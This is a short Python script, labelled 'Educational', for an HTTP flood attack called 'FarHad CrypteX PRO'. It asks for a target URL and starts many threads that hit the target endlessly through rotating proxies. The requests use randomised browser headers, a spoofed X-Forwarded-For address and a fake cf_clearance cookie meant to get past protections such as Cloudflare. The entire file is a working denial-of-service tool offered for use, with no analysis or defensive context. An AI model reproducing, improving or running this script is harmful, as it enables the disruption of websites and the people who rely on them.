# FarHad CrypteX PRO - Educational HTTP Flood Tool

import requests
import threading
import random
import time

# ====== CONFIGURATION ======

target = input("Enter Target URL (with http/https): ").strip()

proxy_file = "proxies.txt"  # Proxy list file
threads = int(input("Enter number of threads: "))

# ====== HEADER POOLS ======

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
]

accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "*/*"
]

referrers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://yandex.com/"
]

# ====== Load Proxies ======

try:
    with open(proxy_file, "r") as f:
        proxies = f.read().splitlines()
    if not proxies:
        raise Exception("Proxy list is empty!")
except Exception as e:
    print(f"[ERROR] {e}")
    exit()

# ====== Flood Function ======

def flood():
    while True:
        try:
            proxy = random.choice(proxies)
            proxy_dict = {"http": proxy, "https": proxy}
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": random.choice(accept_headers),
                "Referer": random.choice(referrers),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Cookie": f"cf_clearance={random.randint(100000,999999)}"
            }

            response = requests.get(target, headers=headers, proxies=proxy_dict, timeout=5)
            print(f"[+] [{response.status_code}] Success via {proxy}")

        except Exception as e:
            print(f"[-] Failed via {proxy} -> {e}")

        time.sleep(0.1)

# ====== Launcher ======

print("\n🔥 FarHad CrypteX PRO Started 🔥")
print(f"Target: {target}")
print(f"Threads: {threads}")
print(f"Loaded {len(proxies)} proxies.\n")

for i in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)